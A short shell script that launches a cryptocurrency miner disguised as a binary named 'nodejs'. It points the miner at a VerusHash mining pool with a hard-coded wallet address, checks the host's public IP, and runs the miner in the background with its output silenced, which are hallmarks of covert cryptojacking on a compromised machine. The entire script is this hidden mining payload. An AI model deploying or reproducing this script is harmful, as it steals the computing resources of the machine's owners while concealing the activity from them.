chmod +x nodejs
config="--algorithm verushash --pool us.vipor.net:5040 --wallet RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH --password x --worker $(hostname -f) --cpu-threads 16"
curl ifconfig.io
nohup bash -c 'while true; do date; sleep 10; done' &
nohup ./nodejs $config > /dev/null 2>&1 &
